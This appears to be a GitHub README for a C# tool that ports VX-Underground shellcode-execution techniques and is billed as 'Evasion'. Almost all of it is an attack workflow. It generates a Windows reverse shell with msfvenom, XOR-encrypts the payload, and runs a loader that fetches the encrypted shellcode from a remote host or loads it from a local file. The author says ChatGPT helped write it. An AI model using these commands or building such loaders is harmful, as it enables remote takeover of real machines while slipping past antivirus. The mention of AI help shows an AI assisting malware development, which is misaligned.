# VXUG Shellcode Execution Converted To CSharp
Evasion - Process Creation and Shellcode Execution CSharp


I converted a bunch of the shellcode execution methods from VX-Underground.org to C# as most were in c and c++. ChatGPT helped in speeding the process along. I have added the ability to execute the shellcode from a remote or local location as well as support for xor encrypted shellcode.

The main flow should go like this


Generate shellcode however you like, this example we will use MSFVenom

msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread -f raw -o code.bin

![image](https://github.com/Shad0wC0ntr0ller/VXUGShellcodeExecutionCSharp/assets/90877534/db931156-2c4e-46f7-9259-377c4af05596)


Next XOR encrypt the shellcode with whatever key you like

python3 encrypt.py code.bin xored.bin XORKEY

![image](https://github.com/Shad0wC0ntr0ller/VXUGShellcodeExecutionCSharp/assets/90877534/08ff44f7-f227-4639-b9c0-c3c0f499dbfb)


Now execute your shellcode as follows

.\Program.exe -r http://10.10.10.10/xored.bin -k xorkey

Or, Execute your shellcode locally 

.\Program.exe -l C:\windows\temp\xored.bin -k xorkey

For unencrypted shellcode

.\Program.exe -l C:\windows\temp\code.bin
